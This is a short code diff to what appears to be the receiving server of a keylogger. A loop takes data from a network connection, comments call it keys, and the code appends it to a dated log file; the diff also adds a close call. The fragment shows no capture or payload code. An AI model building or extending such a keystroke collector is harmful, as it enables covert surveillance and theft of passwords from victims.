@@ -24,14 +24,13 @@ while True:
 
             #Getting the current time for the filename
             now = datetime.now()
-            time = now.strftime('%d\%m\%Y_%H:%M:%S') + '.log'
+            date = now.strftime('%d\%m\%Y') + '.log'
             
             #Writing the keys to a file
-            KeyReciever = open(time,'a')
+            KeyReciever = open(date,'a')
             print(str(data))
             KeyReciever.write(str(data))
             
+    KeyReciever.close()
     connection.close()
     break
-
-
